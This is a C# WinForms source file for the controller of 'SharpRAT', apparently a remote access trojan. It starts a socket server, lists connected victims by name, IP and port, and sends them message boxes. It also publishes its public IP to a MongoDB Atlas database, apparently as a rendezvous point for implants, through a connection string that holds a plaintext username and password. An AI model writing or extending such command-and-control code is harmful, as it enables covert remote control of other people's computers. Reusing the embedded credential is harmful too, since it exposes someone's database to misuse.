using Server.Server;
using MongoDB.Bson;
using MongoDB.Bson.Serialization.Attributes;
using MongoDB.Driver;
using System;
using System.Net;
using System.Net.Sockets;

namespace Server
{
    public partial class Main : Form
    {
        private readonly ImageList imageList;
        private readonly SocketServer socketServer;
        #pragma warning disable CS8618
            public static RequestUI uiRequests;
#pragma warning restore CS8618

        public Main()
        {
            socketServer = new SocketServer();
            uiRequests = new RequestUI();
            imageList = new ImageList();
            InitializeComponent();
            MongoInit();
        }
        public string ipget()
        {
            WebClient webClient = new WebClient();
            string publicIp = webClient.DownloadString("https://api.ipify.org");
            Console.WriteLine("My public IP Address is: {0}", publicIp);
            return publicIp;

        }
        
        private void MongoInit()
        {
            var client = new MongoClient(
            "mongodb+srv://Snutri:tCbJtoBWdEHCOEjS@sharprat.t4wds.mongodb.net/SharpRAT?retryWrites=true&w=majority");
            // Create the collection object that represents the "products" collection

            var database = client.GetDatabase("SharpRAT");

            var connections = database.GetCollection<BsonDocument>("connections");

            // Clean up the collection if there is data in there

            database.DropCollection("connections");

            // collections can't be created inside a transaction so create it first

            database.CreateCollection("connections");

            // Create some sample data
            var newest = new BsonDocument
            { 
                { "AdminName", "test" },
                { "CurrentIp", ipget() }
            };

            // Insert the sample data 
            connections.InsertOne(newest);
            return;
        
        }
            //var database = client.GetDatabase("test");
        
        private void AddUserToViewlist(string text)
        {
            // Parse text
            string
                szName = text.Split("<SPLIT>")[0],
                szIPAddress = text.Split("<SPLIT>")[1],
                szPort = text.Split("<SPLIT>")[2];

            Bitmap image;
            image = Properties.Resources.user;
            imageList.Images.Add(image);
            userView.SmallImageList = imageList;
            userView.View = View.Details;
            ListViewItem userViewItem = new ListViewItem { ImageIndex = imageList.Images.Count - 1, Text = szName };
            userViewItem.SubItems.Add(szIPAddress);
            userViewItem.SubItems.Add(szPort);
            userView.Items.Add(userViewItem);
        }

        private void RemoveUserFromViewlist(string text)
        {
            int index = int.Parse(text);
            try
            {
                userView.Items[index].Remove();
                userView.Update();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void UpdateStatus(string statusText)
        {
            statusLbl.Text = "Status: " + statusText;
        }

        private void Main_Load(object sender, EventArgs e)
        {
            // Start the server on it's own thread, so it does not hog all the UI resources.
            Thread serverThread = new Thread(socketServer.ExecuteServer);
            serverThread.IsBackground = true;
            serverThread.Start();
            UpdateStatus("Server started");
        }

        private void uiUpdateTimer_Tick(object sender, EventArgs e)
        {
            int requestID = uiRequests.RequestReceived();
            if (requestID != 0) // Another thread requested UI to update requsted item.
            {
                switch(uiRequests.GetRequestType(requestID)) // Check request type and call the correct function.
                {
                    case RequestUI.RequestType.UI_ADD_USER:
                        AddUserToViewlist(uiRequests.GetRequestText(requestID));
                        break;
                    case RequestUI.RequestType.UI_REMOVE_USER:
                        RemoveUserFromViewlist(uiRequests.GetRequestText(requestID));
                        break;
                    case RequestUI.RequestType.UI_UPDATE_STATUS:
                        UpdateStatus(uiRequests.GetRequestText(requestID));
                        break;
                }
            }
        }

        private void sendMessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageboxCreator messageboxCreator = new MessageboxCreator(socketServer, userView.SelectedItems[0].Index);
            messageboxCreator.ShowDialog();
        }

        private void userMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if(userView.SelectedItems.Count == 0) // No items selected, no need to open.
                e.Cancel = true;
        }
    }
}